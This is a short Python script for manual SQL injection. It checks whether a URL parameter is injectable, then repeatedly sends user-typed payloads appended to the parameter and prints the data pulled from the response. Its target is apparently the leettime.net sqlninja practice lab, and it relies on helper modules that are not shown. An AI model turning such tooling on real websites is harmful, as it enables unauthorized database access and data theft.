import requests
import validator.valid_checkers as valid
from bs4 import BeautifulSoup
import checker.searcher as checker
import colorama
import re
import urllib.parse

colorama.init(autoreset=True)


def get_content(html, param):
    soup = BeautifulSoup(html.text, 'lxml')
    all_data = soup.find_all(param)
    results = [data for num, data in enumerate(all_data[0].contents) if num % 2 == 1]
    return results


def manual_exploit(site):
    is_vuln, msg, pattern = checker.search_vuln(site, is_print=False, is_pattern=True)
    if is_vuln:
        print(msg)
        while True:
            payload = input("\nEnter payload: ")
            if payload == "0":
                exit()
            else:
                site_for_req = site.split('=')
                result = valid.check_res(site_for_req[0] + "=-1" + payload)
                if len(result) == 4:
                    msg = f'{colorama.Fore.RED}{result[2]}'
                elif len(result) == 3:
                    msg = f'{colorama.Fore.RED}{result[-1]} return 404'
                else:
                    msg = colorama.Fore.RED + "\n".join(get_content(result[0], pattern))
                print(msg)
    else:
        print(msg)


if __name__ == "__main__":
    # manual_exploit('http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1')
    # print(find_pattern("http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'"))
    # print(get_content("http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1"))
    manual_exploit('http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1')
